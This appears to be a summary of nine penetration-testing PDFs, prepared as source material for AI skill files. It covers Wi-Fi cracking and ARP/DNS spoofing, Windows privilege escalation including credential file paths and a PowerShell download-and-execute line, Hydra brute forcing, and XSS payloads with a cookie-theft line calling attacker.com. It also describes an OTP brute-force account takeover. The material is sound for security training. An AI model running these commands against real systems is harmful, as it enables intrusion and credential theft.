# Batch 6 PDF Analysis - SecOps CLI Guides

## Overview
This document contains structured analysis of 9 PDF files from Batch 6 for creating SKILLS.md files for Claude AI.

---

## 1. Shodan Pentesting Guide

### Main Topic/Focus Area
Comprehensive guide to using Shodan for penetration testing, security research, and network reconnaissance. Covers the Shodan search engine for Internet-connected devices, including IoT, servers, and industrial control systems.

### Key Techniques, Tools, or Commands

**CLI Tool Commands:**
```bash
# Installation
easy_install shodan
pacman -S python-shodan  # BlackArch

# Setup API key
shodan init <YOUR_API_KEY>

# Basic commands
shodan info                    # Check credits
shodan count openssh           # Count search results
shodan host 1.1.1.1           # Get host information
shodan myip                    # Get your external IP
shodan search product:mongodb  # Search database
shodan download openssh-data openssh  # Download results
shodan parse --fields ip_str,port,hostnames data.json.gz  # Parse results
shodan scan submit IP          # Scan specific IP
shodan stats nginx             # Get statistics
shodan honeyscore IP           # Check if honeypot
```

**Search Filters:**
- `product:` - Filter by product name
- `port:` - Filter by port number
- `country:` - Filter by country code
- `org:` - Filter by organization
- `has_screenshot:true` - Only hosts with screenshots
- `os:` - Filter by operating system

**Web Interface Features:**
- Search engine with WebUI
- Maps interface for geographic visualization
- Images gallery (VNC, RDP, RTSP, Webcams, X Windows)
- Exploits search engine
- Network monitor for asset tracking
- ICS Radar for Industrial Control Systems
- Report generation

### Target Audience
**Intermediate to Advanced** - Requires understanding of networking, port scanning, and security concepts.

### Practical Workflows

1. **Reconnaissance Workflow:**
   - Initialize API with key
   - Search for target organization/technology
   - Download and parse results
   - Identify vulnerable services

2. **Asset Monitoring Workflow:**
   - Add IPs/domains to monitor
   - Configure alert triggers
   - Track exposed services
   - Receive notifications on changes

3. **Vulnerability Discovery:**
   - Search for specific products/versions
   - Use exploit search engine
   - Cross-reference with vulnerability databases

### Prerequisites/Dependencies
- Python 2.7+ or Python 3
- Shodan API key (free or paid)
- Network access to Shodan services
- Optional: Virtual environment (pyenv)

### Common Use Cases
- Network security assessment
- Attack surface mapping
- IoT device discovery
- Industrial control system identification
- Market research on technology adoption
- Ransomware tracking
- Honeypot detection
- Vulnerability scanning

---

## 2. Top Web Vulnerabilities

### Main Topic/Focus Area
Comprehensive reference of the Top 100 web application security vulnerabilities, covering definitions, root causes, impacts, and mitigations for each vulnerability type.

### Key Techniques, Tools, or Commands

**Vulnerability Categories:**

1. **Injection Vulnerabilities:**
   - SQL Injection (SQLi) & Blind SQLi
   - Cross-Site Scripting (XSS)
   - Command Injection / OS Command Injection
   - XML Injection
   - LDAP Injection
   - XPath Injection
   - HTML Injection
   - Server-Side Includes (SSI) Injection
   - Server-Side Template Injection (SSTI)

2. **Broken Authentication & Session Management:**
   - Session Fixation
   - Session Hijacking
   - Brute Force Attacks
   - Password Cracking
   - Weak Password Storage
   - Cookie Theft
   - Credential Reuse

3. **Sensitive Data Exposure:**
   - Data Leakage
   - Unencrypted Data Storage
   - Missing Security Headers
   - Inadequate Encryption

4. **Access Control:**
   - Insecure Direct Object References (IDOR)
   - CSRF (Cross-Site Request Forgery)
   - Remote Code Execution (RCE)

**Mitigation Techniques:**
- Input validation and sanitization
- Parameterized queries/prepared statements
- Output encoding
- Content Security Policy (CSP) headers
- Multi-factor authentication (MFA)
- Secure session management
- Password hashing with salt (bcrypt, Argon2)
- HTTPS enforcement
- HttpOnly and Secure cookie flags

### Target Audience
**All Levels** - Beginner-friendly definitions with advanced mitigation strategies.

### Practical Workflows

1. **Vulnerability Assessment:**
   - Identify vulnerability category
   - Understand root cause
   - Assess potential impact
   - Apply appropriate mitigation

2. **Secure Development:**
   - Reference during code review
   - Implement mitigations proactively
   - Test for common vulnerabilities

### Prerequisites/Dependencies
- Basic understanding of web applications
- Knowledge of HTTP/HTTPS protocols
- Familiarity with programming concepts

### Common Use Cases
- Security training reference
- Penetration testing checklist
- Secure code development guide
- Compliance documentation
- Bug bounty hunting reference

---

## 3. WI-FI Hacking Notes

### Main Topic/Focus Area
Complete guide to Wi-Fi penetration testing, covering wireless adapter setup, reconnaissance, attack techniques, and network security best practices using Kali Linux.

### Key Techniques, Tools, or Commands

**Wireless Adapter Setup:**
```bash
# Check adapter recognition
lsusb
ifconfig

# Install drivers (Realtek)
sudo apt-get install realtek-rtl88xxau-dkms

# Enable monitor mode
sudo airmon-ng start wlan0

# Verify monitor mode
iwconfig
```

**MAC Address Operations:**
```bash
# Find MAC address
ifconfig wlan0 | grep ether

# Spoof MAC address
sudo ifconfig wlan0 down
sudo ifconfig wlan0 hw ether 00:11:22:33:44:55
sudo ifconfig wlan0 up
```

**Reconnaissance:**
```bash
# Scan for networks
airodump-ng wlan0mon

# Target specific network
airodump-ng --bssid [BSSID] -c [channel] -w capture wlan0mon
```

**Attack Techniques:**

*Deauthentication Attack:*
```bash
aireplay-ng --deauth 0 -a [BSSID] wlan0mon
```

*WEP Cracking:*
```bash
aireplay-ng -1 0 -e [SSID] -a [BSSID] -h [MAC] wlan0mon  # Fake auth
aireplay-ng -3 -b [BSSID] -h [MAC] wlan0mon              # ARP replay
aircrack-ng capture*.cap                                  # Crack key
```

*WPA/WPA2 Cracking:*
```bash
airodump-ng --bssid [BSSID] -c [channel] -w capture wlan0mon  # Capture handshake
aircrack-ng -w wordlist.txt -b [BSSID] capture*.cap           # Dictionary attack
reaver -i wlan0mon -b [BSSID] -vv                             # WPS attack
```

**Post-Connection Attacks:**
```bash
# MITM with ARP poisoning
ettercap -T -q -i wlan0mon -M arp:remote /[victim_IP]/ /[router_IP]/

# DNS Spoofing
ettercap -T -q -i wlan0mon -M arp:remote /[victim_IP]/ /[router_IP]/ -P dns_spoof

# Session hijacking
ferret -i wlan0mon
hamster
```

**Network Scanning (Nmap):**
```bash
nmap -sn 192.168.1.0/24        # Ping scan
nmap -sV 192.168.1.5           # Service version detection
nmap -A 192.168.1.5            # Aggressive scan
nmap -sS 192.168.1.5           # Stealth SYN scan
```

**Password Attacks (Hydra):**
```bash
hydra -l admin -P passwords.txt ftp://192.168.1.5
hydra -l root -P passwords.txt ssh://192.168.1.5
hydra -t 16 -l admin -P passwords.txt ssh://192.168.1.5  # Parallel
```

### Target Audience
**Beginner to Intermediate** - Includes explanations of concepts alongside practical commands.

### Practical Workflows

1. **Wireless Penetration Test Workflow:**
   - Set up wireless adapter in monitor mode
   - Scan for available networks
   - Identify target network
   - Capture handshakes
   - Perform deauth attack if needed
   - Crack password using wordlist

2. **Post-Exploitation:**
   - Connect to network
   - Perform MITM attacks
   - Capture credentials
   - DNS spoofing for phishing

### Prerequisites/Dependencies
- Kali Linux or similar pentesting OS
- Wireless adapter supporting monitor mode and packet injection
- Aircrack-ng suite
- Wireshark
- Reaver
- Ettercap
- Nmap, Hydra

### Common Use Cases
- Wireless network security assessment
- WPA/WPA2 password testing
- Network traffic interception
- Security awareness training
- Penetration testing engagements

---

## 4. Windows Privilege Escalation Secrets

### Main Topic/Focus Area
Comprehensive Windows privilege escalation techniques, covering enumeration, password extraction, service exploitation, kernel exploits, and impersonation attacks.

### Key Techniques, Tools, or Commands

**Enumeration Tools:**
```powershell
# PowerSploit PowerUp
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://...')

# Watson (.NET)
Watson.exe

# Seatbelt
Seatbelt.exe -group=all -full
Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"

# PrivescCheck
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"

# Windows Exploit Suggester NG
python3 wes.py --update
python3 wes.py systeminfo.txt
```

**System Information:**
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe                                    # List patches
wmic os get osarchitecture                 # Architecture
set                                         # Environment variables
wmic logicaldisk get caption               # List drives
```

**User/Group Enumeration:**
```cmd
whoami /priv                               # User privileges
whoami /groups                             # Group membership
net user                                   # All users
net localgroup administrators              # Admin group members
nltest /DCLIST:DomainName                 # Domain controllers
```

**Password Extraction Locations:**

*SAM and SYSTEM Files:*
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\System32\config\SYSTEM
```

*Password Search:*
```cmd
findstr /SI /M "password" *.xml *.ini *.txt
REG QUERY HKLM /F "password" /t REG_SZ /S /K
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```

*Wifi Passwords:*
```cmd
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
```

*Unattend.xml locations:*
```
C:\Windows\Panther\Unattend.xml
C:\Windows\system32\sysprep\sysprep.xml
```

**Privilege Escalation Techniques:**
- Unquoted Service Paths
- DLL Hijacking
- $PATH Interception
- Named Pipes exploitation
- AlwaysInstallElevated abuse
- Kernel exploits (MS08-067, MS17-010, etc.)
- Token Impersonation (RottenPotato, JuicyPotato, RoguePotato)
- WSL exploitation
- Vulnerable drivers
- Printer exploits

**Default Writable Folders:**
```
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\spool\drivers\color
```

### Target Audience
**Intermediate to Advanced** - Requires understanding of Windows internals and security concepts.

### Practical Workflows

1. **Enumeration Workflow:**
   - Gather system information
   - Enumerate users and groups
   - Check privileges and permissions
   - Search for stored credentials
   - Identify misconfigurations

2. **Exploitation Workflow:**
   - Run automated enumeration tools
   - Identify vulnerable services/paths
   - Exploit misconfigurations
   - Escalate to SYSTEM

### Prerequisites/Dependencies
- Access to Windows system (low-privilege shell)
- PowerShell (preferably unrestricted)
- Enumeration tools (PowerUp, Seatbelt, etc.)
- Mimikatz for credential extraction

### Common Use Cases
- Penetration testing
- Red team operations
- OSCP exam preparation
- Security auditing
- Post-exploitation activities

---

## 5. Windows Privilege Escalation

### Main Topic/Focus Area
Detailed Windows privilege escalation reference covering similar content to "Secrets" version with additional techniques for service exploitation, DLL hijacking, and Microsoft Installer abuse.

### Key Techniques, Tools, or Commands

**Additional Tools Mentioned:**
- Sherlock (deprecated) - PowerShell patch finder
- BeRoot - Multi-platform priv esc project
- windows-privesc-check - Standalone executable
- WindowsExploits - Precompiled exploits
- WindowsEnum - PowerShell enumeration
- Powerless - OSCP-focused enumeration
- JAWS - Windows enumeration script
- winPEAS - Comprehensive enumeration

**Microsoft Windows Installer Exploitation:**

*AlwaysInstallElevated:*
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

*CustomActions abuse for privilege escalation*

**Process Enumeration:**
```cmd
tasklist /v
tasklist /v /fi "username eq system"
net start
sc query
schtasks /query /fo LIST 2>nul | findstr TaskName
```

**CVE Exploits Covered:**
- MS08-067 (NetAPI)
- MS10-015 (KiTrap0D)
- MS11-080 (adf.sys)
- MS15-051 (Client Copy Image)
- MS16-032
- MS17-010 (Eternal Blue)
- CVE-2019-1388
- CVE-2021-36934 (HiveNightmare)

### Target Audience
**Intermediate to Advanced** - OSCP preparation focused.

### Practical Workflows
*Same as Windows Privilege Escalation Secrets with additional focus on CVE exploitation*

### Prerequisites/Dependencies
- Same as Secrets document
- Knowledge of specific CVEs for exploitation

### Common Use Cases
- OSCP certification preparation
- CTF competitions
- Penetration testing
- Red team engagements

---

## 6. Wireshark

### Main Topic/Focus Area
Wireshark cheat sheet for network traffic analysis, packet capture, display filters, and security investigation.

### Key Techniques, Tools, or Commands

**Basic Operations:**
| Action | Shortcut |
|--------|----------|
| Open Capture File | Ctrl + O |
| Save Capture File | Ctrl + S |
| Start/Stop Capture | Ctrl + E |
| Find Packet | Ctrl + F |
| Go to Packet | Ctrl + G |

**Display Filters:**
```
ip.addr == 192.168.1.1       # Specific IP
tcp.port == 80               # TCP port
udp.port == 53               # DNS traffic
http                         # HTTP traffic
ssl or tls                   # Encrypted traffic
tcp.flags.syn == 1           # SYN packets
tcp.flags.reset == 1         # RST packets
dns.flags.response == 1      # DNS responses
frame contains "example.com" # String search
tcp.analysis.retransmission  # Retransmissions
icmp                         # ICMP traffic
arp                          # ARP traffic
```

**Analysis Tools:**
| Tool | Location | Description |
|------|----------|-------------|
| Protocol Hierarchy | Statistics > Protocol Hierarchy | Protocol breakdown |
| Conversations | Statistics > Conversations | Communication listing |
| Endpoints | Statistics > Endpoints | IP/MAC endpoints |
| Flow Graph | Statistics > Flow Graph | Packet flow visualization |
| I/O Graphs | Statistics > I/O Graph | Traffic over time |
| Expert Information | Analyze > Expert Information | Errors and warnings |

**Follow Stream:**
- TCP Stream: Right-click > Follow > TCP Stream
- UDP Stream: Right-click > Follow > UDP Stream
- HTTP Stream: Right-click > Follow > HTTP Stream

**Security Analysis Scenarios:**
| Scenario | Filter/Approach |
|----------|-----------------|
| Port Scanning | `ip.src == x.x.x.x && tcp.flags.syn == 1` |
| Slow Connections | `tcp.analysis.retransmission` |
| Suspicious Traffic | `!(ip.addr == <trusted network>)` |
| ARP Spoofing | `arp.duplicate-address-frame` |

### Target Audience
**Beginner to Intermediate** - Quick reference for common operations.

### Practical Workflows

1. **Traffic Analysis:**
   - Capture network traffic
   - Apply display filters
   - Follow streams
   - Export relevant packets

2. **Security Investigation:**
   - Filter for suspicious activity
   - Check Expert Information
   - Analyze protocol hierarchy
   - Document findings

### Prerequisites/Dependencies
- Wireshark installed
- Network interface access (or PCAP files)
- Basic networking knowledge

### Common Use Cases
- Network troubleshooting
- Security investigation
- Protocol analysis
- Forensic analysis
- Performance monitoring

---

## 7. WordPress Pentesting

### Main Topic/Focus Area
Complete guide to setting up WordPress environments and performing security assessments using WPScan vulnerability scanner.

### Key Techniques, Tools, or Commands

**WordPress Setup (Linux):**
```bash
# Install prerequisites
apt install apache2
apt install mariadb-server mariadb-client
apt install php php-mysql

# Database setup
mysql -u root -p
CREATE DATABASE wordpress;
CREATE USER 'wp_user'@'localhost' IDENTIFIED BY 'password';
GRANT ALL ON wordpress.* TO 'wp_user'@'localhost';

# WordPress installation
cd /var/www/html
wget http://www.wordpress.org/latest.tar.gz
tar -xvf latest.tar.gz
chown -R www-data:www-data wordpress/
chmod -R 755 wordpress/
```

**Docker Setup:**
```yaml
version: '3.3'
services:
   db:
     image: mysql:5.7
     environment:
       MYSQL_ROOT_PASSWORD: somewordpress
       MYSQL_DATABASE: wordpress
   wordpress:
     image: wordpress:latest
     ports:
       - "8000:80"
     environment:
       WORDPRESS_DB_HOST: db:3306
```
```bash
docker-compose up -d
```

**WPScan Commands:**
```bash
# Basic scan
wpscan --url http://target/wordpress/

# Enumerate themes
wpscan --url http://target/wordpress/ -e at    # All themes
wpscan --url http://target/wordpress/ -e vt    # Vulnerable themes

# Enumerate plugins
wpscan --url http://target/wordpress/ -e ap    # All plugins
wpscan --url http://target/wordpress/ -e vp    # Vulnerable plugins

# Enumerate users
wpscan --url http://target/wordpress/ -e u

# Brute force attack
wpscan --url http://target/wordpress/ -U admin -P passwords.txt

# Complete enumeration
wpscan --url http://target/wordpress/ -e at,ap,u

# Scan with proxy
wpscan --url http://target/wordpress/ --proxy http://proxy:8080

# HTTP authentication
wpscan --url http://target/wordpress/ --http-auth user:pass
```

**WPScan Capabilities:**
- WordPress version detection
- Sensitive file detection (readme, robots.txt)
- Theme enumeration with version info
- Plugin enumeration and vulnerability detection
- Username enumeration
- Password brute force
- Proxy support
- HTTP authentication bypass

**Metasploit Integration:**
- `exploit/unix/webapp/wp_admin_shell_upload` - Shell upload via admin access

### Target Audience
**Beginner to Intermediate** - Step-by-step setup and scanning instructions.

### Practical Workflows

1. **Environment Setup:**
   - Install LAMP stack
   - Configure database
   - Install WordPress
   - Add vulnerable plugins for testing

2. **Penetration Testing:**
   - Run WPScan enumeration
   - Identify vulnerable plugins/themes
   - Enumerate users
   - Brute force weak passwords
   - Exploit vulnerabilities

### Prerequisites/Dependencies
- Kali Linux (WPScan preinstalled)
- Ruby (for WPScan)
- Target WordPress installation
- WPScan API token (optional, for vulnerability database)

### Common Use Cases
- WordPress security assessment
- Plugin/theme vulnerability scanning
- Password strength testing
- Security training
- Bug bounty hunting

---

## 8. XSS with Examples

### Main Topic/Focus Area
Practical cross-site scripting (XSS) exploitation with step-by-step examples showing various bypass techniques and payload variations.

### Key Techniques, Tools, or Commands

**Basic XSS Payloads:**
```html
<!-- Basic script injection -->
<script>alert(1)</script>
<SCRIPT>alert(1)</SCRIPT>

<!-- Image tag with error handler -->
<img src=AAAAAAAAA onerror=alert(1) />
<img src=AAAAAAAAA onerror=alert(document.domain) />

<!-- SVG payload -->
<svg/onload=alert('1')>

<!-- Alternative alert functions -->
<script>window.confirm('xss')</script>
<script>window.prompt('xss')</script>

<!-- Script escape payloads -->
</script><script>alert(1)</script>

<!-- Quote escape -->
';alert(1)'
';alert(1);'

<!-- Form escape -->
"/><script>alert(1)</script>
```

**XSS Types Demonstrated:**
1. **Reflected XSS** - Payload in URL parameters
2. **DOM-Based XSS** - Client-side JavaScript manipulation
3. **HTML Injection** - Injecting HTML tags

**Filter Bypass Techniques:**
- Case variation (`<SCRIPT>` vs `<script>`)
- Alternative event handlers (`onerror`, `onload`)
- Different HTML tags (`<img>`, `<svg>`)
- Quote escaping
- URL encoding (`%27` for `'`)
- Context-aware payloads

**Information Exfiltration:**
```javascript
// Get domain
document.domain

// Get cookies (if not HttpOnly)
document.cookie

// Redirect with data
window.location='http://attacker.com/steal?c='+document.cookie
```

### Target Audience
**Beginner to Intermediate** - Practical examples with visual demonstrations.

### Practical Workflows

1. **XSS Discovery:**
   - Identify input reflection points
   - Test basic payloads
   - Apply bypass techniques
   - Confirm execution

2. **Exploitation:**
   - Craft context-appropriate payload
   - Test in target browser
   - Exfiltrate sensitive data

### Prerequisites/Dependencies
- Web browser
- Target vulnerable application
- Basic HTML/JavaScript knowledge
- For DOM XSS: older/vulnerable browser versions

### Common Use Cases
- Web application security testing
- Bug bounty hunting
- Security training
- CTF competitions
- Vulnerability demonstration

---

## 9. Broken Authentication

### Main Topic/Focus Area
Comprehensive guide to broken authentication vulnerabilities in web applications and APIs, covering attack types, examples, and practical exploitation.

### Key Techniques, Tools, or Commands

**Authentication Concepts:**
- Single-Factor Authentication (SFA)
- Two-Factor Authentication (2FA)
- Multi-Factor Authentication (MFA)
- Session management
- Password hashing and salting

**Attack Types:**

1. **Credential Stuffing:**
   - Using leaked credential databases
   - Automated testing across multiple sites
   - Botnet-powered attacks

2. **Password Spraying:**
   - Common passwords against many users
   - Bypasses account lockouts
   - Common passwords: "123456", "password"

3. **Phishing Attacks:**
   - Broad-based email campaigns
   - Spear phishing (targeted)
   - Credential harvesting

4. **Brute Force:**
   - Systematic password guessing
   - OTP brute forcing
   - Rate limit bypass

**Vulnerability Examples:**

1. **Single-Factor Authentication Only:**
   - No MFA implementation
   - Passwords as only barrier

2. **Improper Session Timeouts:**
   - Sessions don't expire
   - Session fixation possible

3. **Weak Password Storage:**
   - Plaintext passwords
   - Unsalted hashes
   - Weak algorithms

**Practical Lab (crAPI):**
```
# OTP Brute Force Attack
1. Request password reset for victim
2. Intercept OTP verification request
3. Use Burp Intruder to brute force OTP
4. Check for API version bypass (v3 -> v2)
5. Retrieve valid OTP
6. Change victim's password
```

**Root Causes:**
- Weak password policies
- Missing rate limiting
- Predictable session tokens
- Improper password storage
- No MFA enforcement

### Target Audience
**Beginner to Intermediate** - Includes theoretical concepts and practical exploitation.

### Practical Workflows

1. **Authentication Testing:**
   - Identify authentication mechanisms
   - Test password policies
   - Check session management
   - Attempt brute force
   - Test for rate limiting

2. **API Authentication Testing:**
   - Test API versioning bypass
   - OTP brute forcing
   - Token analysis
   - Session manipulation

### Prerequisites/Dependencies
- Burp Suite (for interception/brute force)
- crAPI or similar vulnerable API
- Understanding of HTTP/session concepts
- Wordlists for credential testing

### Common Use Cases
- API security testing
- Authentication mechanism assessment
- OWASP Top 10 testing
- Security compliance audits
- Penetration testing

---

## Summary Statistics

| PDF | Pages | Topic Category | Difficulty |
|-----|-------|----------------|------------|
| Shodan Pentesting Guide | 80 | Reconnaissance/OSINT | Intermediate-Advanced |
| Top Web Vulnerabilities | 33 | Web Security Reference | All Levels |
| WI-FI Hacking Notes | 13 | Wireless Security | Beginner-Intermediate |
| Windows Privilege Escalation Secrets | 34 | Post-Exploitation | Intermediate-Advanced |
| Windows Privilege Escalation | 26 | Post-Exploitation | Intermediate-Advanced |
| Wireshark | 6 | Network Analysis | Beginner-Intermediate |
| WordPress Pentesting | 44 | Web Application Testing | Beginner-Intermediate |
| XSS with Examples | 22 | Web Exploitation | Beginner-Intermediate |
| Broken Authentication | 12 | API/Web Security | Beginner-Intermediate |

---

## Cross-Reference Topics

### Overlapping Content:
- **Windows Privilege Escalation** documents have significant overlap (~90%)
- **XSS** content relates to "Top Web Vulnerabilities" XSS section
- **Broken Authentication** covers topics from "Top Web Vulnerabilities"

### Complementary Guides:
- **Shodan** + **Wireshark** = Full reconnaissance stack
- **WordPress Pentesting** + **XSS/Authentication** = Web app testing
- **Wi-Fi Hacking** + **Wireshark** = Network penetration testing
- **Windows Priv Esc** documents = Complete Windows post-exploitation
